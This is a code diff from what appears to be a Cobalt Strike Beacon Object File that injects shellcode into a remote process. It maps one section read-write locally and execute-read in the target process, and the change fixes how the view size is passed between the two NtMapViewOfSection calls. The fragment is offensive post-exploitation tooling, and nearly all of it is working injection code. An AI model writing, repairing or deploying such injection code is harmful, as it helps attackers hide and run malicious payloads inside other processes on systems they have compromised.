@@ -43,7 +43,9 @@ void go(char * args, int len) {
     }
 
     // Map RW Section of Local Process
-    NtStatus = NTDLL$NtMapViewOfSection(hSection, hLocalProcess, &baseAddrLocal, NULL, 0,  NULL, &shellcodeSize, 2, 0, PAGE_READWRITE);
+    // ViewSize is IN/OUT: the kernel writes the page-rounded size back
+    SIZE_T viewSize = shellcodeSize;
+    NtStatus = NTDLL$NtMapViewOfSection(hSection, hLocalProcess, &baseAddrLocal, NULL, 0,  NULL, &viewSize, 2, 0, PAGE_READWRITE);
     if(NtStatus != NT_SUCCESS) {
         ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
         BeaconPrintf(CALLBACK_ERROR, "Error mapping local process. Error: %d\n", error);
@@ -51,7 +53,8 @@ void go(char * args, int len) {
     }
 
     // Map view of same section for remote process
-    NtStatus = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, NULL, 0, NULL, &shellcodeSize, 2, 0, PAGE_EXECUTE_READ);
+    viewSize = shellcodeSize;
+    NtStatus = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, NULL, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
     if(NtStatus != NT_SUCCESS) {
         ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
         BeaconPrintf(CALLBACK_ERROR, "Error mapping remote process. Error: %d\n", error);
